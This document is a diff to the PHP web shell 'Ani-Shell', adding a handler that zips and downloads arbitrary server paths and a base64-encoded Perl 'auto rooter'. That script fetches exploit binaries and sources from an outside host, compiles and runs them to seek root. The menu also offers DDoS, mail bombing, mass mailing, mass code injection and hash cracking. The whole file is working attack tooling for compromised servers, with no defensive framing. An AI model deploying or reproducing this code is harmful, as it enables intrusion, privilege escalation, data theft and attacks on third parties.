@@ -27,38 +27,90 @@
 Jai Hind
 */
 
-error_reporting(0);
 ini_set('max_execution_time',0);
+ini_set('memory_limit','999999999M');
 
+
+function Zip($source, $destination) // Thanks to Alix Axel
+{
+    if (!extension_loaded('zip') || !file_exists($source)) {
+        return false;
+    }
+
+    $zip = new ZipArchive();
+    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
+        return false;
+    }
+
+    $source = str_replace('\\', '/', realpath($source));
+
+    if (is_dir($source) === true)
+    {
+        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
+
+        foreach ($files as $file)
+        {
+            $file = str_replace('\\', '/', realpath($file));
+
+            if (is_dir($file) === true)
+            {
+                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
+            }
+            else if (is_file($file) === true)
+            {
+                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
+            }
+        }
+    }
+    else if (is_file($source) === true)
+    {
+        $zip->addFromString(basename($source), file_get_contents($source));
+    }
+
+    return $zip->close();
+}
+
+if(isset($_GET['zip'])) {
+	$src = $_GET['zip'];
+	$dst = getcwd()."/".basename($_GET['zip']).".zip";
+	if (Zip($src, $dst) != false) {
+		$filez = file_get_contents($dst);
+		header("Content-type: application/octet-stream");
+		header("Content-length: ".strlen($filez));
+		header("Content-disposition: attachment; filename=\"".basename($dst)."\";");
+		echo $filez;
+	}
+	exit;
+}
 
 // ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\
 
 /**************** Defines *********************************/
 
-$greeting = "¥¤ W3lc0m3 M4st3r ¬¬";
-$user = "lionaneesh";
-$pass = "lionaneesh";
-$lock = "on"; // set this to off if you dont need the login page
-$antiCrawler = "off"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
-$tracebackFeature = "off"; // set this feature to enable email alerts
-$ownerEmail = "lionaneesh@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
-$url = (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
-$phpVersion=phpversion();
-$self=$_SERVER["PHP_SELF"]; // Where am i
-$sm = @ini_get('safe_mode');
-$SEPARATOR = '/'; // Default Directory separator
-$os = "N/D";
+$greeting 		= "0x xx W3lc0m3 M4st3r xx x0";
+$user 			= "lionaneesh";
+$pass 			= "lionaneesh";
+$lock 			= "on"; // set this to off if you dont need the login page
+$antiCrawler 		= "off"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
+$tracebackFeature 	= "off"; // set this feature to on to enable email alerts
+$ownerEmail 		= "lionaneesh@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
+$url 			= (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
+$phpVersion		= phpversion();
+$self			= $_SERVER["PHP_SELF"]; // Where am i
+$sm 			= @ini_get('safe_mode');
+$SEPARATOR 		= '/'; // Default Directory separator
+$os 			= "N/D";
 
 if(stristr(php_uname(),"Windows"))
 {
         $SEPARATOR = '\\';
         $os = "Windows";
 }
+
 else if(stristr(php_uname(),"Linux"))
 {
         $os = "Linux";
 }
-
 
 //*************************************************************/
 
@@ -87,8 +139,7 @@ Hey Owner ,
         1. Please check if the shell is secured.
         2. Change your user name and Password.
         3. Check if lock is 0n!
-        and Kick that ****** out!
-        
+
         Thanking You
         
 Yours Faithfully
@@ -156,7 +207,7 @@ else
 ?>
 <html>
 <head>
-<title>––•(–•-Ani-Shell–•–)•–– | lionaneesh | India</title>
+<title>Ani-Shell | India</title>
 
 <?php
 if($antiCrawler != 'off')
@@ -175,9 +226,29 @@ if($antiCrawler != 'off')
 ==========================
 */
 
-*{
+* {
     padding:0;
     margin:0;
+}
+
+html, body {
+	height: 100%;
+}
+
+#container {
+min-height: 100%;
+margin-bottom: -330px;
+position: relative;
+}
+
+#footer {
+height: 330px;
+position: relative;
+}
+
+.clearfooter {
+height: 330px;
+clear: both;
 }
 
 .alert
@@ -259,7 +330,7 @@ div.header
 div.nav
 {
     margin-top:1px;
-    height:30px;
+    height:60px;
     background-color: #ccc;
 }
 div.nav ul
@@ -279,7 +350,7 @@ textarea.cmd
     background-color : green;
     font-family: Shell;
     color : white;
-    margin-top: 10px;
+    margin-top: 30px;
     font-size:small;
 }
 
@@ -316,18 +387,15 @@ table.top
 }
 td.file a , .file a
 {
-    color : aqua;
     text-decoration:none;
 }
 a.dir
 {
-    color:white;
     font-weight:bold;
     text-decoration:none;
 }
 td.dir a
 {
-    color : white;
     text-decoration:none;
 }
 td.download,td.download2
@@ -345,23 +413,30 @@ th.header
     color: white;
     border-bottom : 1px solid #333333;
 }
-p.warning
+p.alert_red
 {
     background : red;
     color: white;
 }
 
+p.alert_green
+{
+    background : lightgreen;
+    color: black;
+}
 /*
 
 --------------------------------CSS END------------------------------------------------------
 
 */
 </style>
+
 </head>
 
 <body text="rgb(39,245,10)" bgcolor="black">
-<?php
 
+<div id='container'>
+<?php
 if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')
 {
     if( $_POST['user'] == $user &&
@@ -379,7 +454,7 @@ if(isset($_POST['user']) && isset($_POST['pass']) && $lock == 'on')
 
 if($lock == 'off')
 {?>
-    <p class="warning"><b>Lock is Switched Off! , The shell can be accessed by anyone!</b></p>
+    <p class="alert_red"><b>Lock is Switched Off! , The shell can be accessed by anyone!</b></p>
 <?php
 }
 
@@ -421,6 +496,13 @@ if($lock == 'on' && (!isset($_SESSION['authenticated']) || $_SESSION['authentica
 </pre>
             </td>
             <td>
+                   <?php
+                   // <div id="wassup">
+                   //      include("http://ani-shell.sourceforge.net/wassup.txt");
+                   //</div>
+                   ?>
+                   
+
                 <h1><?php echo $greeting;?></h1><br /><br />
                 <form method="POST" action="<?php echo $_SERVER['PHP_SELF'];?>">
                 <input name="user" value="Username"/> <input name="pass" type="password" value="Password"/> <input class="own" type="Submit" value="Own This Box!"/>
@@ -491,7 +573,7 @@ function freeSpace()
 function getSafeMode()
 {
         global $sm;
-		echo($sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF");
+		echo($sm?"ON (Most of the Features will Not Work)":"OFF");
         
 }
 
@@ -563,9 +645,29 @@ return $info;
 
 }
 
+// Dir size
+
+/**
+ * Get the directory size
+ * @param directory $directory
+ * @return integer
+ */
+function dirSize($directory) {
+    $size = 0;
+    foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file){
+        try {       
+            $size += $file->getSize();
+        }
+        catch (Exception $e){    // Symlinks and other shits
+            $size += 0;
+        }
+    }
+    return $size;
+}
+
 /***********************************************************/
 // exec_all , A function used to execute commands , This function will only execute if the Safe Mode is
-// Turned OfF!
+// Turned OFF!
 /**********************************************************/
 
 
@@ -649,14 +751,11 @@ function exec_all($command)
         }
         pclose($handle);
     }
-    else
-    {
-        $output = "They have their Security there! :( ";
-    }
-    
+
     return(htmlspecialchars($output));
     
 }
+
 function magicQuote($text)
 {
     if (!get_magic_quotes_gpc())
@@ -672,32 +771,38 @@ function md5Crack($hash , $list)
     if( strlen($hash) != 32  || $fd == FALSE)
     {
         // echo "$hash , " . strlen($hash) ." , $list , $fd"; // Debugging
-        return "<p class='warning'>Hash or List invalid!</p>";
+        return "<p class='alert_red'>Hash or List invalid!</p>";
     }
     else
     {
-        $pwdList = fread($fd,512);
-        
-        $pwdList = explode("\n",$pwdList);
-        
-        echo "Words Checked :-<br /><br />\n";
-            
-        
-        foreach($pwdList as $pwd)
+        while (! feof( $fd ))
         {
-            $pwd = trim($pwd);
-            
-            echo "<br />[*] ".$pwd;
-            
-            if(md5($pwd) == $hash )
+            if( ($pwdList = fgets( $fd, 1024 )) == FALSE)
             {
-                return "<br /><br /><br />\n<h2>Hash Cracked</h2><br /><br />\n<p class='warning'>Planintext : $pwd</p>";
+                break;
+            }
+            $pwdList = trim($pwdList);
+            
+            if(md5($pwdList) == $hash )
+            {
+                    return "<script>alert('Password Cracked');</script>\n<h2>Hash Cracked</h2><br /><br />\n<p class='alert_green'>Planintext : $pwdList</p>";
             }
         }
             
-    
     }
 }
+
+function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)
+{
+    $link = mysql_connect($sql_server.":".$port,$sql_user,$sql_pass);
+    if(!$link)
+    {
+        return 'Could not connect: ' . mysql_error();
+    }
+    $resource = mysql_query($query);
+    if(!$resource) return(mysql_error());
+}
+
 //------------------------------------------------------------------------------------------------
 
 
@@ -740,15 +845,18 @@ Your IP : <?php getClientIp(); ?> <font color="silver" >|</font> Server IP : <?p
     <li><a href="<?php echo $self;?>">Home</a></li>
     <li><a href="<?php echo $self.'?upload';?>">Upload</a></li>
     <li><a href="<?php echo $self.'?shell';?>">Shell</a></li>
+    <li><a href="<?php echo $self.'?r00t'?>">Aut0 R00t3r (Unix/Linux)</a></li>
     <li><a href="<?php echo $self.'?dos';?>">DDoS</a></li>
     <li><a href="<?php echo $self.'?fuzz';?>">Web-Server Fuzzer</a></li>
     <li><a href="<?php echo $self.'?mail'?>">Mass Mailer</a></li>
     <li><a href="<?php echo $self.'?bomb'?>">Mail Bomber</a></li>
     <li><a href="<?php echo $self.'?connect'?>">Connect</a></li>
     <li><a href="<?php echo $self.'?injector'?>">Mass Code Injector</a></li>
-    <li><a href="<?php echo $self.'?decode'?>">PHP Decoder</a></li>
+    <li><a href="<?php echo $self.'?obfuscate'?>">PHP Obfuscator</a></li>
     <li><a href="<?php echo $self.'?eval'?>">PHP Evaluate</a></li>
     <li><a href="<?php echo $self.'?md5'?>">MD5 Cracker</a></li>
+    <li><a href="<?php echo $self.'?gdork'?>">Google Dork Creator</a></li>
+
 
     <?php if($lock == 'on')
     {
@@ -760,6 +868,7 @@ Your IP : <?php getClientIp(); ?> <font color="silver" >|</font> Server IP : <?p
 </ul>
 </div>
 
+<center>
 <?php
 //-------------------------------- Check what he wants -------------------------------------------
 
@@ -787,12 +896,323 @@ if(isset($_GET['shell']))
     <?php
 }
 
+// Auto Rooter (Linux/Unix Only!) with Perl Installed
+
+else if(isset($_GET['r00t']))
+{
+    // Note : The Perl Auto Rooter Perl Script was originally written by iskorpitx , All credits to him for an awesome
+    // Piece of code , and thanks to eXes0ul for providing me the links . ;) 
+    
+    $r00t =
+"IyEvdXNyL2Jpbi9wZXJsIA0KIyBFeHBsb2l0IHRvb2xzIHYyLjAgY29kZWQgYnkgaXNrb3JwaXR4
+IChUdXJraXNoIEhhY2tlcikNCiMgbGludXggc2VydmVybGVyZGUgZ2VjZXJsaWRpcg0KIyBpeWkg
+c2Fuc2xhcjopDQojIGJ5IGlza29ycGl0eA0KeyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
+MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
+IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K
+c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy80NCIpOyAg
+DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOyANCnN5c3RlbSgiLi80NCIpOyANCnN5c3RlbSgiaWQi
+KTsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOTUy
+MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA5NTIxIik7IA0Kc3lzdGVtKCIuLzk1MjEiKTsgDQpz
+eXN0ZW0oImlkIik7ICANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
+L2ZpbGUvY2MvZnJvb3QiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZnJvb3QiKTsgDQpzeXN0ZW0o
+Ii4vZnJvb3QiKTsgDQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7
+DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oIndnZXQgMjc3MDQuYyBkb3du
+bG9hZHMuc2VjdXJpdHlmb2N1cy5jb20vdnVsbmVyYWJpbGl0aWVzL2V4cGxvaXRzLzI3NzA0LmMi
+KTsgDQpzeXN0ZW0oImdjYyAyNzcwNC5jIC1vIDI3NzA0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3
+IDI3NzA0Iik7IA0Kc3lzdGVtKCIuLzI3NzA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJ
+ZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8v
+d2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgtMS5jIik7IA0Kc3lzdGVtKCJnY2MgLVdh
+bGwgLW8gMTgtMSAxOC0xLmMiKTsgDQpzeXN0ZW0oImdjYyAtV2FsbCAtbTY0IC1vIDE4LTMgMTgt
+MS5jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE4
+LTMiKTsgDQpzeXN0ZW0oIi4vMTgtMSIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgt
+MyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj
+dHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl
+L2NjLzE4LTIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMiIpOyANCnN5c3RlbSgiLi8xOC0y
+Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0
+cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv
+Y2MvMTgtMSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOC0xIik7IA0Kc3lzdGVtKCIuLzE4LTEi
+KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry
+bCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
+Yy9ydW4iKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVuIik7IA0Kc3lzdGVtKCIuL3J1biIpOyAN
+CnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2Nc
+biI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4
+cGxvaXQuYyIpOyAgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
+DQpzeXN0ZW0oIndnZXQgcnVuX2V4cGxvaXRzLnNoIHdnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NN
+U19GSUxFUy9maWxlL2NjL3J1bl9leHBsb2l0cy5zaCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBy
+dW5fZXhwbG9pdHMuc2giKTsgDQpzeXN0ZW0oIi4vcnVuX2V4cGxvaXRzLnNoIik7IA0KcHJpbnQg
+IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6
+Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2ht
+b2QgNzc3IGV4cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnByaW50ICJJZiB1IHIg
+cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
+MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y
+Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4
+cCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwIik7ICANCnN5c3RlbSgi
+Y2htb2QgNzc3IGV4cCIpOyANCnN5c3RlbSgiLi9leHAiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lz
+dGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHAxIik7ICAN
+CnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsgDQpzeXN0ZW0oIi4vZXhwMSIpOyANCnN5c3RlbSgi
+aWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2Nj
+L2V4cDIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7
+IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ
+TEVTL2ZpbGUvY2MvZXhwMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7IA0Kc3lzdGVt
+KCIuL2V4cDMiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4cDQgaHR0cDovL3dh
+cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3Nzcg
+ZXhwNCIpOyANCnN5c3RlbSgiLi9leHA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dl
+dCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwNSIpOyAgDQpzeXN0ZW0o
+ImNobW9kIDc3NyBleHA1Iik7IA0Kc3lzdGVtKCIuL2V4cDUiKTsgDQpzeXN0ZW0oImlkIik7IA0K
+c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA2Iik7
+ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4cDYiKTsgDQpzeXN0ZW0oIi4vZXhwNiIpOyANCnN5c3Rl
+bSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl
+L2NjL2V4cDciKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwNyIpOyANCnN5c3RlbSgiLi9leHA3
+Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T
+X0ZJTEVTL2ZpbGUvY2MvZXhwOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHA4Iik7IA0Kc3lz
+dGVtKCIuL2V4cDgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
+OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA5Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4
+cDkiKTsgDQpzeXN0ZW0oIi4vZXhwOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
+IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
+NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL3J1bjIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVu
+MiIpOyANCnN5c3RlbSgiLi9ydW4yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg
+cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3
+MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y
+Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciBy
+MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcx
+LmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4
+cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi
+SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDov
+L3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cGxvaXQyIik7ICANCnN5c3RlbSgiY2ht
+b2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc3lzdGVtKCJpZCIp
+OyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgi
+d2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwbG9pdDIiKTsgIA0K
+c3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdDIiKTsgDQpz
+eXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4i
+Ow0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9ydW4y
+Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bjIiKTsgDQpzeXN0ZW0oIi4vcnVuMiIpOyANCnN5
+c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7
+DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkt
+MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LTEiKTsgDQpzeXN0ZW0oIi4vMjAwOS0xIik7
+IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwr
+Y1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2Mv
+ZGVybGUuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlLmMgLW8gZGVybGUiKTsgIA0Kc3lzdGVtKCJj
+aG1vZCA3NzcgZGVybGUiKTsgDQpzeXN0ZW0oIi4vZGVybGUiKTsgDQpzeXN0ZW0oImlkIik7IA0K
+cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0
+IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zLmMiKTsgDQpzeXN0ZW0oImdj
+YyAzLmMgLW8gMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAzIik7IA0Kc3lzdGVtKCIuLzMiKTsg
+DQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtj
+XG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8z
+YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDNhIik7IA0Kc3lzdGVtKCIuLzNhIik7IA0Kc3lzdGVt
+KCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5
+c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNC5jIik7IA0K
+c3lzdGVtKCJnY2MgNC5jIC1vIDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOyANCnN5c3Rl
+bSgiLi80Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3
+aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
+L2ZpbGUvY2MvNGEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA0YSIpOyANCnN5c3RlbSgiLi80YSIp
+OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs
+K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j
+Yy9jeC5jIik7IA0Kc3lzdGVtKCJnY2MgY3guYyAtbyBjeCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3
+NyBjeCIpOyANCnN5c3RlbSgiLi9jeCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
+IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx
+OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jeHguYyIpOyANCnN5c3RlbSgiZ2NjIGN4eC5jLSBv
+IGN4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBjeHgiKTsgDQpzeXN0ZW0oIi4vY3h4Iik7IA0K
+c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu
+IjsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4
+cGxvaXQyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhw
+bG9pdDIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp
+dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBydW4gaHR0cDovL3dhcjE5NzEuY29tL0NNU19G
+SUxFUy9maWxlL2NjL3J1biIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJ1biIpOyANCnN5c3RlbSgi
+Li9ydW4iKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp
+dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT
+L2ZpbGUvY2MvcnVuLnNoIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bi5zaCIpOyANCnN5c3Rl
+bSgiLi9ydW4uc2giKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3Ag
+eHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNf
+RklMRVMvZmlsZS9jYy8yOS5jIik7IA0Kc3lzdGVtKCJnY2MgMjkuYyAtbyAyOSIpOyAgDQpzeXN0
+ZW0oImNobW9kIDc3NyAyOSIpOyANCnN5c3RlbSgiLi8yOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpw
+cmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oImh0dHA6
+Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zMCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3
+NyAzMCIpOyANCnN5c3RlbSgiLi8zMCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy
+IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5
+NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAw
+OSIpOyANCnN5c3RlbSgiLi8yMDA5Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg
